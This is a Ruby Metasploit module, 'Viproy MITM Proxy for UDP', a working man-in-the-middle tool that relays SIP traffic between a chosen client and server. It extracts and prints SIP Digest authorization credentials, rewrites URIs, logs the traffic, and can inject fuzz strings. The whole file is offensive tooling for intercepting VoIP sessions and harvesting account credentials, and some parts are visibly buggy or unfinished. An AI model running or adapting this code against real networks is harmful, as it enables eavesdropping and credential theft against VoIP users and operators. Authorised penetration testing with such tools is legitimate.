##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      'Name'           => 'Viproy MITM Proxy for UDP',
      'Version'        => '1',
      'Description'    => 'MITM Proxy for UDP',
      'License'        => 'GPL',
      'Author'         => 'fozavci',
      'References'     =>	[],
    )
    deregister_options('RHOST','RHOSTS','RPORT')

    register_options(
      [
        OptAddress.new('PRXCLT_IP',   [true, 'Local IP of UDP Socket for Remote SIP Client']),
        OptInt.new('PRXCLT_PORT',   [true, 'Local UDP Port of UDP Socket for Remote SIP Client',5061]),
        OptAddress.new('PRXSRV_IP',   [true, 'Local IP of UDP Socket for Remote SIP Server']),
        OptInt.new('PRXSRV_PORT',   [true, 'Local UDP Port of UDP Socket for Remote SIP Server',5060]),
        OptAddress.new('CLIENT_IP',   [true, 'IP of Remote SIP Client']),
        OptInt.new('CLIENT_PORT',   [true, 'Port of Remote SIP Client',5060]),
        OptAddress.new('SERVER_IP',   [true, 'IP of Remote SIP Server']),
        OptInt.new('SERVER_PORT',   [true, 'Port of Remote SIP Server',5060]),
        OptString.new('LOGFILE',   [ false, "Log file for content"]),

      ], self.class)

    register_advanced_options(
      [
        OptPath.new('REPLACEFILE',      [ false, "File containing Replacements, one per line"]),
        OptBool.new('DEBUG',   [ false, "Debug Level", false]),
      ], self.class)
  end

  #
  # Start the service
  #
  def run
    # SIP sockets are starting
    vprint_status("Listening on #{@prxclient_ip}:#{@prxclient_port} for the SIP client.")
    @prxclient=udpsock(@prxclient_ip,@prxclient_port)
    vprint_status("Listening on #{@prxserver_ip}:#{@prxserver_port} for the SIP server.")
    @prxserver=udpsock(@prxserver_ip,@prxserver_port)
    start_monitor
    while true
      # Fix this later
    end
  end

  #
  # Stop the service
  #
  def cleanup
    if ! @prxclient.closed? or ! @prxserver.closed?
      vprint_status("Closing the server sockets.")
      @prxclient.close if ! @prxclient.closed?
      @prxserver.close if ! @prxserver.closed?
    end
  end

  def setup
    @logfile = File.new(datastore['LOGFILE'], "w") if datastore['LOGFILE']
    set_replacefile(datastore['REPLACEFILE']) if datastore['REPLACEFILE']

    @client_ip = datastore['CLIENT_IP']
    @client_port = datastore['CLIENT_PORT']
    @server_ip = datastore['SERVER_IP']
    @server_port = datastore['SERVER_PORT']

    @prxclient_ip = datastore['PRXCLT_IP']
    @prxclient_port = datastore['PRXCLT_PORT']
    @prxserver_ip = datastore['PRXSRV_IP']
    @prxserver_port = datastore['PRXSRV_PORT']
  end

  #
  # Start a SIP socket
  #
  def udpsock(listen_addr,listen_port)
    listen_addr = "0.0.0.0" if listen_addr.nil?
    sock = Rex::Socket::Udp.create(
        'LocalHost' => listen_addr,
        'LocalPort' => listen_port,
    )
    return sock
  end

  #
  # Start the monitors
  #
  def start_monitor
    [@prxclient,@prxserver].each { |sock|
      Rex::ThreadFactory.spawn("SIPSocketMonitor", false) {
        monitor_socket(sock)
      }
    }
  end

  # Start a SIP socket monitor
  def monitor_socket1(sock)
      while true
        if sock.peerhost != nil
          print_status("Socket : #{sock.peerhost}")
          buf,srcip,srcport = sock.recvfrom()
          srcip=sanitize_address(srcip).to_s
          vprint_status("Incoming data from #{srcip} #{srcport}") if datastore['DEBUG']
          vprint_status("#{buf}")
          dispatch_request(srcip,srcport,buf)
        end
      end
  end

  #Monitor Socket
  def monitor_socket(sock)
    begin
      while true
        rds = [sock]
        wds = []
        eds = [sock]
        r,w,e = ::IO.select(rds,wds,eds,1)
        if (r != nil and r[0] == sock)
          buf,srcip,srcport = sock.recvfrom()
          srcip=sanitize_address(srcip).to_s
          dispatch_request(srcip,srcport,buf)
        end
      end
    rescue ::Exception => e
      print_error("Error #{e}")
    end
  end

  # Dispatch requests
  def dispatch_request(srcip,srcport,buf)
    print_status("From: #{srcip}:#{srcport} #{buf}")
    logwrite(buf,srcip) if @logfile

    if srcip == @client_ip
      vprint_status("Client port is defined as #{srcport}")
      @client_port = srcport
      prxredirect(@prxserver,buf,srcip,"clt")
    elsif srcip == @server_ip
      prxredirect(@prxclient,buf,srcip,"srv")
    else
      print_error("Content from an unknown location => "+srcip+":"+srcport)
    end
  end

  # removes any leading ipv6 stuff, such as ::ffff: as it breaks JtR
  # obtained from 'Patrik Karlsson <patrik[at]cqure.net>' sip capture module
  def sanitize_address(addr)
    if ( addr =~ /:/ )
      return addr.scan(/.*:(.*)/)[0][0]
    end
    return addr
  end

  def prxredirect(sipprx,buf,ip,type)
    vprint_status("Content from "+ip+":\n #{buf}")

    # Fix the replacement later
    # buf=replace_port_ip(buf,type)
    if (buf =~ /^Authorization: Digest \s*(.*)$/i)
      creds=$1
      req_type=buf.split(" ")[0]
      print_good("SIP Account Credentials : ")
      buf=buf.gsub("uri=\"sip:#{self.server_ip}\"","uri=\"sip:#{self.prxclient_ip}\"")
      print_good(" request="+req_type)
      creds.split(", ").each do |c|
        print_good(" #{c.gsub("\"","")}")
      end
    end

    # Fix the replacement later
    # buf=replace_it(buf) if @replacement_table
    logwrite(buf,ip) if @logfile
    sipprx.send(buf)
  end

  def replace_port_ip(data,type)
    @replace_portiptable[type].each do |r,c|
      #vprint_status("Type #{type} : Replace For"+r+"=>"+c)
      #vprint_status("Content is :\n"+data)
      data.gsub!(r,c)
    end
    return data
  end


  def replace_it(data,type)
    @replacement_table[type].each do |r,c|
      print_status("Replacements are #{r} to #{c}")
      data.gsub!(r,c)
    end
    return data
  end

  def set_replacefile(f)
    print_status("Replacement File is "+f.to_s)
    @replacement_table = {}
    @replacement_table["RES"] = {}
    @replacement_table["REQ"] = {}
    contents=File.new(f, "r")
    contents.each do |line|
      next if line =~ /^#/
      type=line.split("\t")[0]
      t = line.split("\t")[1]
      r = Regexp.new t
      c = line.split("\t")[2..1000].join("\t").chop

      if c =~ /FUZZ/
        str = "A" * c.split(" ")[1].to_i
        print_status(str)
      else
        str = c
        print_status(str)
      end

      case type
        when "RES"
          @replacement_table[type][r] = str
        when "REQ"
          @replacement_table[type][r] = str
        when "BOTH"
          @replacement_table["RES"][r] = str
          @replacement_table["REQ"][r] = str
      end

    end
  end

  def logwrite(buf,ip)
    begin
      logfile = File.new(@logfname,'a')
      print_status("Logging to #{@logfname}")
      logfile.write "------------------#{ip}------------------\n"
      logfile.write buf+"\n\n"
    rescue ::Errno::EPIPE => e
      print_error(e.message)
    ensure
      logfile.close
    end
    print_status("Logged to #{@logfname}")
  end

end


